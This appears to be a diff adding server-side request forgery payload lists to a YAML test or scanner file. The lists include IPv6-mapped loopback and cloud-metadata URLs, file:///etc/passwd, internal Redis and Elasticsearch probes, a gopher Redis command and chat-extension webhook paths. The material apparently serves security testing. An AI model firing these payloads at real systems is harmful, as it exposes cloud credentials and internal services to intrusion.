@@ -62,3 +62,35 @@ protocol_smuggling:
   - "dict://127.0.0.1:6379/"
   - "dict://127.0.0.1:6379/INFO"
   - "tftp://127.0.0.1/etc/passwd"
+
+# IPv6 SSRF bypass (CVE-2026-28476 pattern)
+ipv6_bypass:
+  - "http://[::ffff:127.0.0.1]/"
+  - "http://[::ffff:7f00:1]/"
+  - "http://[0:0:0:0:0:ffff:127.0.0.1]/"
+  - "http://[::1]/"
+  - "http://[::1]:8080/"
+  - "http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/"
+  - "http://[::ffff:169.254.169.254]/latest/meta-data/"
+  - "http://[::ffff:a9fe:a9fe]/latest/meta-data/"
+  - "http://[::ffff:10.0.0.1]/"
+  - "http://[::ffff:172.16.0.1]/"
+
+# Attachment/media URL hydration SSRF
+attachment_ssrf:
+  - "http://169.254.169.254/latest/meta-data/"
+  - "http://metadata.google.internal/computeMetadata/v1/"
+  - "file:///etc/passwd"
+  - "http://127.0.0.1:11434/api/tags"
+  - "http://127.0.0.1:6379/"
+  - "http://127.0.0.1:9200/_cluster/health"
+  - "gopher://127.0.0.1:6379/_INFO"
+
+# Extension-specific SSRF endpoints
+extension_ssrf:
+  - "/api/v1/extensions/tlon/auth"
+  - "/api/v1/extensions/feishu/webhook"
+  - "/api/v1/extensions/feishu/callback"
+  - "/api/v1/extensions/slack/events"
+  - "/api/v1/extensions/telegram/webhook"
+  - "/api/v1/extensions/discord/webhook"
